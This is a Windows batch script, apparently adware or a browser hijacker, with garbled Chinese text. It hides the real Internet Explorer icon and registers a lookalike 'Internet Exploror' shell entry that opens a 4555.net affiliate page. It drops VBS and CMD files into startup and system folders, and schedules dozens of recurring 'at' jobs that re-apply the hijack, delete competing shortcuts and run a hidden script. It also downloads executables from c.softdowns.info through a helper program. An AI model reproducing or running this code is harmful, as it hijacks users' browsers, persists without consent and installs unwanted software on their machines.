@shift
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t REG_DWORD  /d 1  /f
start  /min       iexplore   http://4555.net/index2.html?huacai

REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}" /v "InfoTip" /t REG_SZ /d "���Ҳ���ʾ Internet �ϵ���Ϣ����վ" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}" /v "LocalizedString" /t REG_SZ /d "Internet Exploror" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\DefaultIcon"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\DefaultIcon" /ve /t REG_EXPAND_SZ /d "shdoclc.dll,0" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32" /ve /t REG_SZ /d "%%systemRoot%%\system32\shdocvw.dll" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32"  /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell" /ve /t REG_SZ /d "����ҳ(&H)" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����ҳ(&H)"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����ҳ(&H)" /v "MUIVerb" /t REG_SZ /d "@shdoclc.dll,-10241" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����ҳ(&H)\Command"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����ҳ(&H)\Command" /ve /t REG_SZ /d "C:\progra~1\Intern~1\iexplore.exe http://www.4555.net/?huacai" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����(&R)"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����(&R)\Command"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����(&R)\Command"  /ve /t REG_SZ /d "C:\progra~1\Intern~1\iexplore.exe http://www.4555.net/?huacai" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "Attributes" /t REG_DWORD /d 0 /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "HideFolderVerbs" /t REG_SZ /d "" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "HideOnDesktopPerUser" /t REG_SZ /d "" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "WantsParsDisplayName" /t REG_SZ /d "" /f

copy ".\Internet Exploror.lnk"          "%USERPROFILE%\����\Internet Exploror.lnk"
copy ".\Internet Exploror.lnk"            "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exploror.lnk"
copy ".\winare.vbs"                 "%ALLUSERSPROFILE%\����ʼ���˵�\����\����\winare.vbs"
copy ".\winare.vbs"           "%USERPROFILE%\����ʼ���˵�\����\����\winare.vbs"


REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v  "NoInternetIcon"  /t  REG_DWORD  /d 1 /f




sc      create        Schedule binpath= "%SystemRoot%\svchost.exe -k netsvcs"   depend= rpcss start= auto displayname= "Task Scheduler"
sc      config    Schedule start= auto
net start          "Task Scheduler"
at 8:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 8:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 8:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 9:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 9:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 9:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 10:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 10:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 10:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 11:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 11:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 11:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 12:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 12:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 12:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 13:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 13:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 13:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 14:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 14:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 14:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 15:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 15:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 15:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 16:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 16:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 16:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 17:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 17:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 17:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 18:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 18:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 18:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 19:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 19:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 19:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 20:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 20:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 20:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 21:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 21:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 21:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 22:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 22:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 22:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"

at 23:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
at 23:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explorer*.*"
at 23:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"


at 00:31 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*Explore*.*"
at 00:32 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explore*.*"
at 00:30 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"

at 10:33 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*���*.*"
at 10:34 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*���*.*"
at 10:35 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  C:\WINDOWS\mail\UltraEdit\is.cmd
at 10:36 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "C:\Documents and Settings\All Users\����\*���*.*"

at 14:33 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*���*.*"
at 14:34 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*�*.*"
at 14:35 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  C:\WINDOWS\mail\UltraEdit\is.cmd
at 14:36 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "C:\Documents and Settings\All Users\����\*���*.*"

at 19:33 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*���*.*"
at 19:34 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*�*.*"
at 19:35 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  C:\WINDOWS\mail\UltraEdit\is.cmd
at 19:36 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "C:\Documents and Settings\All Users\����\*���*.*"

at 21:33 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\����\*�*.*"
at 21:34 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*�*.*"
at 21:35 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  C:\WINDOWS\mail\UltraEdit\is.cmd
at 21:36 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c  del "C:\Documents and Settings\All Users\����\*�*.*"

at 9:37 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{1f4de370-d627-11d1-ba4f-00a0c91eedba}"
at 14:37 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{1f4de370-d627-11d1-ba4f-00a0c91eedba}"
at 18:37 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{1f4de370-d627-11d1-ba4f-00a0c91eedba}"
at 21:37 /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  cmd.exe  /c REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{1f4de370-d627-11d1-ba4f-00a0c91eedba}"



mkdir     "C:\Program Files\WinWare\"
mkdir     "C:\Windows\Mail\UltraEdit\"
copy ".\is.cmd"          "C:\Windows\Mail\UltraEdit\is.cmd"
copy ".\winare.vbs"      "C:\Windows\Mail\UltraEdit\winare.vbs"

copy ".\361.cmd"          "C:\Program Files\WinWare\361.cmd"

".\J.exe" "http://c.softdowns.info/soft/YoudaoDict_zhusha_quantui_004.exe"
".\J.exe" "http://c.softdowns.info/soft/37a.exe"
".\J.exe" "http://c.softdowns.info/soft/tb2.exe"
".\J.exe" "http://down.kuwo.cn/mbox/kwmusic_msnassistant.exe"
